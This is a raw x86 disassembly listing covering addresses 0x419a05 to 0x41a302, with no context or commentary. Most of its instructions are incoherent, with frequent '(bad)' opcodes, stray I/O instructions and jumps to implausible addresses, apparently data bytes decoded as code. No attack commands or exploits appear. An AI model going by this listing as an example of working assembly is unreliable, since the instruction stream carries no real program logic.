  419a05:	repnz add ebx,DWORD PTR [ecx-0x3e7c22]
  419a0c:	js     0x4199df
  419a0e:	fisttp WORD PTR [eax-0x7c]
  419a11:	in     eax,dx
  419a12:	xor    BYTE PTR [eax],al
  419a14:	lods   eax,DWORD PTR ds:[esi]
  419a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a16:	aam    0x62
  419a18:	inc    esi
  419a19:	sbb    al,ah
  419a1b:	jb     0x419a61
  419a1d:	loop   0x419a03
  419a1f:	jbe    0x419a45
	...
  419a35:	add    bl,cl
  419a37:	xor    BYTE PTR [eax],al
  419a39:	and    DWORD PTR [ebp-0x1db99d2c],0xfffffff3
  419a40:	bound  ecx,QWORD PTR [eax-0x49]
  419a43:	in     al,0x48
  419a45:	inc    esp
  419a46:	lods   al,BYTE PTR ds:[esi]
  419a47:	xor    BYTE PTR [eax],al
  419a49:	mov    fs,WORD PTR [ebp+0x720662d4]
  419a4f:	in     al,0x73
  419a51:	aas    
  419a52:	test   ch,bl
  419a54:	jb     0x419a5a
  419a56:	dec    eax
  419a57:	stc    
  419a58:	ds jmp 0x1b40e202
  419a5e:	pop    eax
  419a5f:	out    0x42,al
  419a61:	pop    es
  419a62:	sbb    ah,0x55
  419a65:	or     BYTE PTR [edi-0xc],bh
  419a68:	bound  ebp,QWORD PTR [eax-0x4500bf5c]
  419a6e:	jns    0x419a56
  419a70:	dec    esp
  419a71:	fnstenv [ecx-0x21]
  419a74:	inc    eax
  419a75:	aam    0x52
  419a77:	repz (bad) 
  419a79:	xlat   BYTE PTR ds:[ebx]
  419a7a:	push   eax
  419a7b:	aam    0x70
  419a7d:	les    esi,FWORD PTR [edx]
  419a7f:	jno    0x419a7e
  419a81:	shl    BYTE PTR [ebp+0x59b562c7],cl
  419a87:	repnz bound ebx,QWORD PTR [ebx-0x7b953012]
  419a8e:	in     eax,0x70
  419a90:	std    
  419a91:	mov    al,dh
  419a93:	neg    BYTE PTR [esi-0x67]
  419a96:	std    
  419a97:	xor    DWORD PTR [edx],esi
	...
  419aad:	add    BYTE PTR [eax],al
  419aaf:	fcom   DWORD PTR [eax+0x69]
  419ab2:	ins    BYTE PTR es:[edi],dx
  419ab3:	push   cs
  419ab4:	add    eax,0x5d0d00d5
  419ab9:	bound  ebp,QWORD PTR [edx+ebp*2-0x50]
  419abd:	jne    0x419b24
  419abf:	ins    DWORD PTR es:[edi],dx
  419ac0:	jae    0x419b33
  419ac2:	pop    DWORD PTR gs:[esi]
  419ac5:	outs   dx,DWORD PTR ds:[esi]
  419ac6:	push   0x33695a63
  419acb:	lods   al,BYTE PTR ds:[esi]
  419acc:	sub    BYTE PTR [esp+ebp*2+0x5a],ah
  419ad0:	push   es
  419ad1:	jne    0x419ad3
  419ad3:	ja     0x419b3d
  419ad5:	jno    0x419b3c
  419ad7:	ins    BYTE PTR es:[edi],dx
  419ad8:	push   0x747d7462
  419add:	pop    esi
  419ade:	arpl   WORD PTR [ebp-0x309390af],si
  419ae4:	push   es
  419ae5:	ja     0x419ae7
  419ae7:	(bad)  
  419ae8:	push   0x68ac6571
  419aed:	bound  esi,QWORD PTR [ebp+ecx*8+0x74]
  419af1:	bound  esp,QWORD PTR [ecx+0x72]
  419af4:	arpl   WORD PTR [edx+0x72],dx
  419af7:	stos   BYTE PTR es:[edi],al
  419af8:	inc    ebp
  419af9:	std    
  419afa:	push   DWORD PTR [ecx+0x5f]
  419afd:	imul   ebp,DWORD PTR [ecx+0x78],0x63
  419b01:	jno    0x419b31
  419b03:	bound  ebp,QWORD PTR [eax+0x69]
  419b06:	add    BYTE PTR [ebx+0x7],cl
  419b09:	dec    edi
  419b0a:	je     0x419b78
  419b0c:	push   ebp
  419b0d:	jno    0x419b81
  419b0f:	test   DWORD PTR [esi-0x3],0xff
	...
  419b26:	add    BYTE PTR [eax],al
  419b28:	dec    esi
  419b29:	pop    es
  419b2a:	dec    edi
  419b2b:	je     0x419b19
  419b2d:	push   ecx
  419b2e:	inc    eax
  419b2f:	push   0x3e3eec
  419b34:	and    al,BYTE PTR [edi]
  419b36:	dec    edi
  419b37:	je     0x419b75
  419b39:	inc    eax
  419b3a:	ins    BYTE PTR es:[edi],dx
  419b3b:	dec    ecx
  419b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3d:	xchg   ebp,ebp
  419b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b41:	dec    ebp
  419b42:	add    al,0x51
  419b44:	jnp    0x419b31
  419b46:	shl    DWORD PTR [ebx+0x75],1
  419b49:	call   0x71ed:0x8ca7ea01
  419b50:	fs out dx,al
  419b52:	lock dec ebp
  419b54:	outs   dx,BYTE PTR ds:[esi]
  419b55:	sbb    al,BYTE PTR [esi+ecx*1]
  419b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b59:	sub    al,0xf0
  419b5b:	jno    0x419bd1
  419b5d:	int    0xf1
  419b5f:	inc    esi
  419b60:	jo     0x419bbb
  419b62:	add    DWORD PTR [ecx+0x4f],esi
  419b65:	aad    0xec
  419b67:	pop    esi
  419b68:	aaa    
  419b69:	shl    BYTE PTR ds:0x3c54364,cl
  419b6f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419b71:	ret    0x62e5
  419b74:	sbb    ecx,ecx
  419b76:	loop   0x419bdb
  419b78:	add    ecx,DWORD PTR [esp+eax*1]
  419b7b:	sub    ah,BYTE PTR [edi-0x8c2100]
  419b81:	jo     0x419b75
  419b83:	jae    0x419b8a
  419b85:	add    esp,esi
  419b87:	pop    esi
  419b88:	or     al,BYTE PTR [edi]
  419b8a:	add    al,0x47
	...
  419ba0:	add    BYTE PTR [edi-0x39f1994],ah
  419ba6:	push   es
  419ba7:	lock jmp DWORD PTR [eax+0x0]
  419bab:	add    al,0x61
  419bad:	enter  0xe33f,0x62
  419bb1:	les    ecx,FWORD PTR [ebp+0x1]
  419bb4:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  419bb6:	cmp    al,0xe5
  419bb8:	ins    BYTE PTR es:[edi],dx
  419bb9:	mov    ah,0x3e
  419bbb:	repnz ins BYTE PTR es:[edi],dx
  419bbd:	les    edx,FWORD PTR [eax+eiz*8+0x73]
  419bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc2:	popf   
  419bc3:	add    DWORD PTR [ecx-0x3e],esi
  419bc6:	scas   eax,DWORD PTR es:[edi]
  419bc7:	(bad)  
  419bc9:	and    BYTE PTR [edx],al
  419bcb:	stos   BYTE PTR es:[edi],al
  419bcc:	add    edx,DWORD PTR [esi-0x781f751b]
  419bd2:	mul    dh
  419bd4:	add    ecx,ecx
  419bd6:	add    bl,BYTE PTR [ecx-0x19077820]
  419bdc:	add    esp,DWORD PTR [edx+0x2]
  419bdf:	jp     0x419bc1
  419be1:	je     0x419bd6
  419be3:	test   edx,esp
  419be5:	jg     0x419bc6
  419be7:	jbe    0x419bd8
  419be9:	loopne 0x419c59
  419beb:	or     BYTE PTR [edx+esi*2],al
  419bee:	shl    DWORD PTR [edi],cl
  419bf0:	rcl    DWORD PTR [ecx+eiz*8+0x58],1
  419bf4:	lock push ebp
  419bf6:	repnz out 0x3,al
  419bf9:	cmp    dh,bl
  419bfb:	push   ebp
  419bfc:	loope  0x419c4d
  419bfe:	xor    edi,ecx
  419c00:	and    eax,0x442de4b
	...
  419c19:	add    BYTE PTR [edx+eax*1+0x1b],bl
  419c1d:	in     eax,0x1
  419c1f:	out    0x3b,eax
  419c21:	icebp  
  419c22:	add    eax,0x3f236f1
  419c27:	in     eax,0xff
  419c29:	out    0x5,eax
  419c2b:	(bad)  
  419c2c:	out    0x3,al
  419c2e:	loopne 0x419c32
  419c30:	sbb    al,0xe6
  419c32:	or     al,0xde
  419c34:	pop    es
  419c35:	loopne 0x419c0c
  419c37:	icebp  
  419c38:	or     esi,edx
  419c3a:	fdiv   st,st(0)
  419c3c:	std    
  419c3d:	(bad)  
  419c3f:	fmulp  st(3),st
  419c41:	add    edx,esp
  419c43:	icebp  
  419c44:	ret    
  419c45:	icebp  
  419c46:	(bad)
  419c49:	and    eax,0x3badec3
  419c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4f:	add    ah,bh
  419c51:	add    esp,DWORD PTR [edi-0x58fc18fe]
  419c57:	add    al,BYTE PTR [eax]
  419c59:	jmp    0xe9419f02
  419c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c5f:	add    al,BYTE PTR [eax]
  419c61:	jmp    0xe9419f0a
  419c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c67:	add    al,BYTE PTR [eax]
  419c69:	jmp    0xe9419f12
  419c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6f:	add    al,BYTE PTR [eax]
  419c71:	jmp    0xe9419f1a
  419c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c77:	add    al,BYTE PTR [eax]
  419c79:	jmp    0xe9419f22
	...
  419c92:	add    BYTE PTR [edx+eax*1+0x2a4e900],ah
  419c99:	add    cl,ch
  419c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c9c:	add    al,BYTE PTR [eax]
  419c9e:	jmp    0xe9419f47
  419ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ca4:	add    al,BYTE PTR [eax]
  419ca6:	jmp    0xe9419f4f
  419cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cac:	add    al,BYTE PTR [eax]
  419cae:	jmp    0xe9419f57
  419cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cb4:	add    al,BYTE PTR [eax]
  419cb6:	jmp    0xe9419f5f
  419cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cbc:	add    al,BYTE PTR [eax]
  419cbe:	jmp    0xe9419f67
  419cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cc4:	add    al,BYTE PTR [eax]
  419cc6:	jmp    0xe9419f6f
  419ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ccc:	add    al,BYTE PTR [eax]
  419cce:	jmp    0xe9419f77
  419cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd4:	add    al,BYTE PTR [eax]
  419cd6:	jmp    0xe9419f7f
  419cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cdc:	add    al,BYTE PTR [eax]
  419cde:	jmp    0xe9419f87
  419ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce4:	add    al,BYTE PTR [eax]
  419ce6:	add    BYTE PTR [esi+0x1],cl
  419ce9:	add    BYTE PTR [eax],al
  419ceb:	add    DWORD PTR ds:[eax],eax
  419cee:	add    BYTE PTR [esi],bh
  419cf0:	add    DWORD PTR [eax],eax
  419cf2:	add    BYTE PTR [esi],cl
  419cf4:	add    DWORD PTR [eax],eax
	...
  419d0a:	add    BYTE PTR [eax],al
  419d0c:	push   cs
  419d0d:	add    DWORD PTR [eax],eax
  419d0f:	add    dh,bh
  419d11:	add    BYTE PTR [eax],al
  419d13:	add    bl,bl
  419d15:	cmp    eax,0x3df3cccc
  419d1a:	int3   
  419d1b:	int3   
  419d1c:	push   edx
  419d1d:	jns    0x419d0b
  419d1f:	push   ecx
  419d20:	sbb    al,0xc7
  419d22:	pop    es
  419d23:	mov    bl,BYTE PTR [edi+0x2cff4b7a]
  419d29:	addr16 pop ebx
  419d2b:	ret    
  419d2c:	jb     0x419da7
  419d2e:	in     al,dx
  419d2f:	push   ecx
  419d30:	jns    0x419d07
  419d32:	xor    cl,cl
  419d34:	inc    ebx
  419d35:	jns    0x419da6
  419d37:	xor    BYTE PTR [esp+esi*8],ch
  419d3a:	or     ecx,DWORD PTR [ebx+0x46890e31]
  419d40:	lahf   
  419d41:	jnp    0x419d86
  419d43:	cld    
  419d44:	sbb    al,0xec
  419d46:	pop    ds
  419d47:	mov    ebx,ecx
  419d49:	cmp    BYTE PTR ds:0x8004136b,0x3f
  419d50:	fdivr  st(6),st
  419d52:	add    ebx,ebp
  419d54:	jle    0x419d22
  419d56:	pop    ebp
  419d57:	mov    ecx,DWORD PTR [edx-0x2d333f32]
  419d5d:	ja     0x419d4b
  419d5f:	add    DWORD PTR [ebx-0x60ba76d9],0x79
  419d66:	inc    ebx
  419d67:	loopne 0x419d95
  419d69:	mov    esi,0x62f28bdf
  419d6e:	add    DWORD PTR [ecx+0x0],edx
	...
  419d85:	xchg   ebx,eax
  419d86:	jns    0x419ddb
  419d88:	in     al,0x1c
  419d8a:	(bad)  
  419d8b:	jecxz  0x419d18
  419d8d:	out    dx,eax
  419d8e:	jmp    0xf84b:0x79af4d00
  419d95:	sbb    al,0xd6
  419d97:	test   DWORD PTR [ebx+0x450126e5],0xe84379af
  419da1:	sub    al,0xbe
  419da3:	test   DWORD PTR [ebx+0x55012276],0xf053799f
  419dad:	sub    al,0xc6
  419daf:	test   DWORD PTR [ebx+0x4d010e6f],0xfc4b799f
  419db9:	loopne 0x419d80
  419dbb:	repz add BYTE PTR [edi-0x5114fffe],ah
  419dc2:	ja     0x419e17
  419dc4:	hlt    
  419dc5:	and    al,0x41
  419dc7:	dec    DWORD PTR [eax+0x45897672]
  419dcd:	mov    edi,0x7cf44b77
  419dd2:	mov    edx,0x775f7317
  419dd7:	push   ebx
  419dd8:	lock sbb al,0x1
  419ddb:	add    DWORD PTR [ebp-0x51],eax
  419dde:	jns    0x419e23
  419de0:	fmul   QWORD PTR ds:0xa5ac67fd
  419de6:	ret    0x8aff
	...
  419dfd:	add    dl,bl
  419dff:	dec    esi
  419e00:	dec    edi
  419e01:	call   0x419fdd
  419e06:	and    al,0x46
  419e08:	or     al,0x85
  419e0a:	addr16 cmc 
  419e0c:	sbb    BYTE PTR [ebx+0x458976d2],cl
  419e12:	dec    edi
  419e13:	sti    
  419e14:	mov    ah,0xc
  419e16:	idiv   DWORD PTR [ecx+0x4b]
  419e19:	in     al,dx
  419e1a:	sbb    al,0xd5
  419e1c:	jmp    0x419da9
  419e1e:	loop   0x419e8e
  419e20:	mov    DWORD PTR [edi+edx*1],eax
  419e23:	inc    DWORD PTR [edx+0x8]
  419e26:	dec    esp
  419e27:	std    
  419e28:	mov    BYTE PTR [ebp+0x37],cl
  419e2b:	jg     0x419dec
  419e2d:	add    al,0x1e
  419e2f:	mov    ebp,0x2f4bebef
  419e34:	ror    BYTE PTR [ebx-0x333f32fe],0xe3
  419e3b:	cmp    eax,0x3ddbcccc
  419e40:	int3   
  419e41:	int3   
  419e42:	repz cmp eax,0x7752cccc
  419e48:	in     al,dx
  419e49:	add    DWORD PTR [ebx],0xa
  419e4c:	call   0xfdac8656
  419e51:	mov    DWORD PTR [edx+0x5a],ebp
  419e54:	mov    DWORD PTR [ebp-0x31],eax
  419e57:	shl    edi,1
  419e59:	sub    eax,edx
  419e5b:	push   0xfffffffd
  419e5d:	and    ebx,0x5
  419e60:	mov    eax,ds:0xb4
	...
  419e75:	add    BYTE PTR [eax],al
  419e77:	pop    edx
  419e78:	sar    edi,0x67
  419e7b:	sti    
  419e7c:	(bad)  
  419e7d:	aas    
  419e7e:	add    BYTE PTR [edi*4+0x14a851e7],bl
  419e85:	mov    ah,0x55
  419e87:	out    0x2,al
  419e89:	mov    eax,ds:0xffc3f2b8
  419e8e:	imul   esp,DWORD PTR [edi+0x5b67ffdc],0x80004005
  419e98:	adc    BYTE PTR [eax-0x78fd19ab],bh
  419e9e:	inc    ebp
  419e9f:	jg     0x419ee3
  419ea1:	inc    ebx
  419ea2:	cld    
  419ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea4:	add    al,BYTE PTR [eax]
  419ea6:	add    BYTE PTR [esp+edi*8-0x78],cl
  419eaa:	push   ebp
  419eab:	pop    ebx
  419eac:	xchg   dl,al
  419eae:	add    DWORD PTR [esi],ebx
  419eb0:	sar    bl,1
  419eb2:	or     edx,0x66
  419eb5:	or     BYTE PTR [ebx-0x7a],dh
  419eb8:	jge    0x419efd
  419eba:	cld    
  419ebb:	sub    al,0xf7
  419ebd:	or     BYTE PTR [ebp+eiz*4+0x1c50ffc2],0xd0
  419ec5:	out    0x52,eax
  419ec7:	and    BYTE PTR [eax],dl
  419ec9:	mov    ah,0x55
  419ecb:	data16 add cl,BYTE PTR [ecx+0x47c134d]
  419ed2:	lea    edx,[ebx-0x30]
  419ed5:	add    BYTE PTR ds:[ebx+edx*2],cl
  419ed9:	mov    ebp,esp
	...
  419eef:	add    BYTE PTR [edx+0x45],bl
  419ef2:	int3   
  419ef3:	int3   
  419ef4:	jecxz  0x419f2c
  419ef6:	int3   
  419ef7:	int3   
  419ef8:	(bad)  [esi]
  419efa:	int3   
  419efb:	int3   
  419efc:	repz ss int3 
  419eff:	int3   
  419f00:	jb     0x419f7f
  419f02:	in     al,dx
  419f03:	mov    eax,ds:0x3ed0b7
  419f08:	mov    DWORD PTR [ebp+0x40],edi
  419f0b:	xor    BYTE PTR [eax+edi*4],ch
  419f0e:	pop    es
  419f0f:	ds cs mov ebx,0x36e45d07
  419f16:	int3   
  419f17:	int3   
  419f18:	(bad)  [esi]
  419f1a:	int3   
  419f1b:	int3   
  419f1c:	jae    0x419f54
  419f1e:	int3   
  419f1f:	int3   
  419f20:	bnd jge 0x419f0f
  419f23:	mov    ebp,edx
  419f25:	test   BYTE PTR [edi-0x75],0xda
  419f29:	cli    
  419f2a:	dec    esi
  419f2b:	call   FWORD PTR [edx-0x58beac52]
  419f31:	mov    eax,0xcc3663cc
  419f37:	int3   
  419f38:	pop    ebx
  419f39:	ss int3 
  419f3b:	int3   
  419f3c:	jae    0x419f74
  419f3e:	int3   
  419f3f:	int3   
  419f40:	bnd jge 0x419f2f
  419f43:	add    DWORD PTR [ebx-0x6],0x69
  419f47:	add    BYTE PTR [ebp-0x5a2397fe],bh
  419f4d:	ret    0xfeff
  419f50:	xchg   edx,eax
  419f51:	stos   BYTE PTR es:[edi],al
  419f52:	push   ebx
  419f53:	inc    ecx
	...
  419f68:	add    BYTE PTR [edi-0x4007bc85],ah
  419f6e:	pop    edx
  419f6f:	add    al,BYTE PTR [eax-0x59]
  419f72:	jge    0x419fb7
  419f74:	clc    
  419f75:	ja     0x419fd1
  419f77:	mov    edx,0x816910ff
  419f7c:	les    ebx,FWORD PTR [edi+0x2cfc437b]
  419f82:	mov    bh,0xf
  419f84:	push   ecx
  419f85:	sub    al,0xcf
  419f87:	or     edx,DWORD PTR [edx+0x1c]
  419f8a:	mov    edi,0xcee85007
  419f8f:	sti    
  419f90:	mov    ecx,edx
  419f92:	mov    al,0xcc
  419f95:	jb     0x41a014
  419f97:	in     al,dx
  419f98:	push   ecx
  419f99:	call   0xa7429b5c
  419f9e:	add    al,BYTE PTR [eax]
  419fa0:	jmp    0x419f50
  419fa2:	jge    0x419fe7
  419fa4:	cld    
  419fa5:	and    al,0x42
  419fa7:	dec    DWORD PTR [eax+0x4d89666a]
  419fad:	stos   DWORD PTR es:[edi],eax
  419fae:	sub    al,0x4b
  419fb0:	adc    BYTE PTR [eax+ecx*1],dl
  419fb3:	mov    DWORD PTR [ebp-0x51],edx
  419fb6:	add    edx,DWORD PTR [ebx-0x4]
  419fb9:	mov    al,ds:0xda8b02b0
  419fbe:	test   BYTE PTR [eax],0x4d
  419fc1:	cmp    eax,0xffffffb5
  419fc4:	adc    DWORD PTR [esp+eax*2+0x22f0774],edi
	...
  419fdf:	add    BYTE PTR [eax],al
  419fe1:	add    BYTE PTR [edi+0x77eb045b],ah
  419fe7:	xor    al,0xc0
  419fe9:	mov    eax,DWORD PTR [edx-0x3a]
  419fec:	ror    ah,0x63
  419fef:	aaa    
  419ff0:	int3   
  419ff1:	int3   
  419ff2:	pop    ebx
  419ff3:	aaa    
  419ff4:	int3   
  419ff5:	int3   
  419ff6:	jae    0x41a02f
  419ff8:	int3   
  419ff9:	int3   
  419ffa:	sar    BYTE PTR [ebx-0x14],cl
  419ffd:	mov    ecx,0x28f
  41a002:	ret    
  41a003:	jnp    0x41a00c
  41a005:	mov    DWORD PTR [edx-0x58bea9ee],esi
  41a00b:	(bad)
  41a00e:	jecxz  0x41a046
  41a010:	int3   
  41a011:	int3   
  41a012:	(bad)  [esi]
  41a014:	int3   
  41a015:	int3   
  41a016:	repz ss int3 
  41a019:	int3   
  41a01a:	push   edx
  41a01b:	jnp    0x41a009
  41a01d:	add    DWORD PTR [ebx],0x13
  41a020:	mov    DWORD PTR [ebp-0x61],eax
  41a023:	cmp    DWORD PTR [eax+0x4],0xffffffa7
  41a027:	test   DWORD PTR [ebx+0x2a788],0x88fa628b
  41a031:	push   ecx
  41a032:	mov    ds:0xd608ea83,eax
  41a037:	pop    esp
  41a038:	xchg   DWORD PTR [ebp-0x4d],edx
  41a03b:	jnp    0x41a080
  41a03d:	or     BYTE PTR [ebx+eax*2],ah
  41a040:	or     BYTE PTR [ecx+0x45c57262],cl
	...
  41a05a:	add    BYTE PTR [ebx-0x58fffffe],ah
  41a060:	pop    ebx
  41a061:	pop    es
  41a062:	mov    esp,edx
  41a064:	add    cx,0x79a6
  41a069:	dec    ebx
  41a06a:	cld    
  41a06b:	sub    al,0xcd
  41a06d:	sti    
  41a06e:	cmp    edx,edx
  41a070:	outs   dx,BYTE PTR ds:[esi]
  41a071:	jno    0x41a0b9
  41a073:	sbb    al,0xbd
  41a075:	sti    
  41a076:	mov    ebx,edx
  41a078:	jb     0x41a087
  41a07a:	mov    bh,0xbb
  41a07c:	sar    DWORD PTR [esi-0x57c5406],0x3
  41a083:	fidiv  DWORD PTR [ecx+ecx*4]
  41a086:	inc    ebp
  41a087:	dec    ebx
  41a088:	jnp    0x41a0d5
  41a08a:	lock mov al,0xaf
  41a08d:	adc    al,0x41
  41a08f:	es fs std 
  41a092:	xstore-rng (bad)
  41a093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a094:	add    al,BYTE PTR [edi+0x437b2f55]
  41a09a:	or     BYTE PTR [esi*4+0x7baf030b],ch
  41a0a1:	push   ebx
  41a0a2:	clc    
  41a0a3:	sbb    al,0xfe
  41a0a5:	push   cs
  41a0a6:	add    esp,DWORD PTR [edx+0x12]
  41a0a9:	mov    DWORD PTR [ebp-0x51],ecx
  41a0ac:	jnp    0x41a101
  41a0ae:	or     al,0xa4
  41a0b0:	adc    DWORD PTR [ecx+0x478ef4d],ecx
  41a0b6:	or     bh,ah
  41a0b8:	cwde   
  41a0b9:	mov    DWORD PTR [ebp-0x51],edx
  41a0bc:	jnp    0x41a101
  41a0be:	or     BYTE PTR [eax],al
	...
  41a0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0d5:	les    eax,FWORD PTR [ebx]
  41a0d7:	mov    DWORD PTR [edx-0x6],ebp
  41a0da:	out    0x6b,al
  41a0dc:	enter  0xfd66,0x8b
  41a0e0:	retf   0xc0c4
  41a0e3:	int3   
  41a0e4:	push   edx
  41a0e5:	jnp    0x41a0d3
  41a0e7:	add    ebx,0x1d
  41a0ea:	mov    DWORD PTR [ebp-0x61],eax
  41a0ed:	jns    0x41a132
  41a0ef:	in     al,0x2c
  41a0f1:	mov    eax,0x5ef28be3
  41a0f6:	add    DWORD PTR [ecx-0x2d],edx
  41a0f9:	jnp    0x41a14e
  41a0fb:	call   0x8c29611c
  41a100:	das    
  41a101:	add    DWORD PTR [eax],0x0
  41a104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a105:	jnp    0x41a152
  41a107:	lock and al,0xe8
  41a10a:	out    dx,eax
  41a10b:	add    BYTE PTR [eax-0x58ff0682],bl
  41a111:	add    cl,BYTE PTR [ecx+0x5301af55]
  41a117:	lock push ds
  41a119:	rcr    bh,1
  41a11b:	mov    esp,edx
  41a11d:	bound  eax,QWORD PTR [ecx+0xd029778]
  41a123:	test   BYTE PTR [edx+0x3],al
  41a126:	add    BYTE PTR [eax],al
  41a128:	mov    ebp,0x1c006a02
  41a12d:	mov    eax,0xfa7a8bdf
  41a132:	add    BYTE PTR [ecx-0x55],dl
  41a135:	sar    ah,1
  41a137:	adc    eax,0x0
	...
  41a14c:	add    BYTE PTR [edi-0x30],cl
  41a14f:	add    BYTE PTR ds:[esi],bl
  41a152:	sar    bl,0x8b
  41a155:	push   0x62
  41a157:	cmp    DWORD PTR [eax],0x8b16eea7
  41a15d:	bound  esp,QWORD PTR [edx-0x77]
  41a160:	push   ebp
  41a161:	lahf   
  41a162:	add    DWORD PTR [edi],ecx
  41a164:	mov    DWORD PTR [edx+0x6e],edi
  41a167:	mov    DWORD PTR [ebp-0x39],eax
  41a16a:	jns    0x41a1b7
  41a16c:	or     BYTE PTR [edx+edi*4+0x565a890f],ah
  41a173:	jmp    0xe011cd8f
  41a178:	mov    esp,DWORD PTR [edx-0x6]
  41a17b:	add    BYTE PTR [edx-0x69],al
  41a17e:	jnp    0x41a1c3
  41a180:	hlt    
  41a181:	sbb    al,0xb8
  41a183:	fisttp WORD PTR [ebx+0x1100fafa]
  41a189:	cs iret 
  41a18b:	jmp    0x41a154
  41a18d:	jmp    0x8902:0xa700006a
  41a194:	inc    ebp
  41a195:	xchg   DWORD PTR [ecx-0x1158ef88],eax
  41a19b:	or     al,0x8b
  41a19d:	loop   0x41a201
  41a19f:	cmp    DWORD PTR [ecx],0xc704eea7
  41a1a5:	jmp    0x8902:0xa7ffff6a
  41a1ac:	push   ebp
  41a1ad:	pop    ebx
  41a1ae:	cmp    DWORD PTR [edx],0x0
	...
  41a1c4:	add    BYTE PTR [eax],al
  41a1c6:	shl    ebx,cl
  41a1c8:	mov    BYTE PTR [ebp+0x3b],al
  41a1cb:	jns    0x41a1d5
  41a1cd:	add    DWORD PTR [esi+0x2],0xee270000
  41a1d4:	sbb    ecx,DWORD PTR [ebx+0x2896ed2]
  41a1da:	retf   0xfd65
  41a1dd:	call   FWORD PTR [eax+0x134d88d2]
  41a1e3:	shl    edi,cl
  41a1e5:	mov    ch,0xa
  41a1e7:	gs std 
  41a1e9:	sub    ebx,0xfffffff9
  41a1ec:	xchg   BYTE PTR [ebp-0x25],al
  41a1ef:	pop    eax
  41a1f0:	sbb    al,0x8b
  41a1f2:	pop    edx
  41a1f3:	outs   dx,BYTE PTR ds:[esi]
  41a1f4:	mov    DWORD PTR [edx],eax
  41a1f6:	sbb    al,0xb7
  41a1f8:	pop    es
  41a1f9:	lea    edi,[ebx-0x6]
  41a1fc:	add    DWORD PTR [edx+0x2c],edx
  41a1ff:	mov    edi,0x8cbf50fb
  41a204:	sti    
  41a205:	dec    eax
  41a207:	add    ah,0x8
  41a20a:	cs mov edi,0x566a8bdb
  41a210:	mov    DWORD PTR [ebp-0x2d],edx
  41a213:	jp     0x41a224
  41a215:	mov    esp,DWORD PTR [edx+0x6e]
  41a218:	add    eax,0xf44379ab
  41a21e:	sub    al,0xb6
  41a220:	jmp    0x41a1a5
  41a222:	inc    WORD PTR [esi-0x6aa784b3]
  41a229:	mov    eax,DWORD PTR [eax]
	...
  41a23f:	fisub  DWORD PTR [edx-0x7f]
  41a242:	ret    0x7993
  41a245:	push   ebx
  41a246:	loopne 0x41a2c6
  41a248:	cmc    
  41a249:	cld    
  41a24a:	jmp    FWORD PTR [eax+0x78]
  41a24d:	jecxz  0x41a2ac
  41a24f:	fs aaa 
  41a251:	int3   
  41a252:	int3   
  41a253:	bnd ja 0x41a242
  41a256:	add    DWORD PTR [ebx-0x5],0x67
  41a25a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a25c:	ret    0xfeff
  41a25f:	call   0x4379:0xa7415342
  41a266:	clc    
  41a267:	mov    edi,0xa7400266
  41a26c:	ja     0x41a2b1
  41a26e:	clc    
  41a26f:	ja     0x41a2cb
  41a271:	ds std 
  41a273:	sbb    BYTE PTR [ecx+eax*4-0x3c],ah
  41a277:	lahf   
  41a278:	jns    0x41a2bd
  41a27a:	cld    
  41a27b:	sbb    al,0xb6
  41a27d:	sqrtps xmm5,XMMWORD PTR [esi+ecx*8]
  41a281:	or     edx,DWORD PTR [edx+0x2c]
  41a284:	mov    esi,0xcdf05007
  41a289:	sti    
  41a28a:	mov    eax,DWORD PTR [edx]
  41a28c:	mov    al,0xcc
  41a28f:	repz ss int3 
  41a292:	int3   
  41a293:	jb     0x41a30c
  41a295:	in     al,dx
  41a296:	mov    eax,ds:0x3eccb3
  41a29b:	loope  0x41a29f
  41a29d:	push   0x560e9a8b
  41a2a2:	inc    ecx
	...
  41a2b7:	add    BYTE PTR [edi-0xafeaf87],ah
  41a2bd:	aas    
  41a2be:	mov    BYTE PTR [eax-0x5e],dl
  41a2c1:	(bad)
  41a2c4:	jae    0x41a2fc
  41a2c6:	int3   
  41a2c7:	int3   
  41a2c8:	bnd ja 0x41a2b7
  41a2cb:	add    DWORD PTR [ebx-0xeef610a],0xffffffc1
  41a2d2:	dec    DWORD PTR [edx+0x3ec72f55]
  41a2d8:	sub    al,0xc2
  41a2da:	das    
  41a2db:	mov    edx,DWORD PTR [ebp+0x77]
  41a2de:	sar    BYTE PTR [esi],cl
  41a2e0:	sbb    al,0xba
  41a2e2:	or     ecx,DWORD PTR [ebx-0xbb4868b]
  41a2e8:	sub    al,0xbd
  41a2ea:	repz mov ebx,edi
  41a2ed:	test   BYTE PTR [esi+0x53774f4d],0xf8
  41a2f4:	cs int 0xfb
  41a2f7:	mov    eax,0x2a6
  41a2fc:	sub    al,BYTE PTR [edx+0x74]
  41a2ff:	inc    esp
  41a300:	and    al,0xe5
  41a302:	test   DWORD PTR [eax],0xc030fe9a
